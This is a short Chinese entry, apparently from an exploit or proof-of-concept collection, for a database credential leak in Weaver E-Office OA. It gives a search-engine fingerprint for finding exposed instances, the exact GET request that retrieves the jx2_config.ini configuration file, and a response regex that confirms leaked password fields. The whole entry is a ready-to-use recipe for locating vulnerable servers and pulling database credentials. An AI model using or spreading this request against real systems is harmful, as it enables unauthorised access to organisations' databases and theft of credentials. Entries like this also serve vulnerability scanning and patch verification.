# 泛微OA数据库账号密码泄露

泛微OA ｜ 信息泄露 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1`
- **响应特征**：200 ^(?=.*?password)(?=.*?sdb).*?$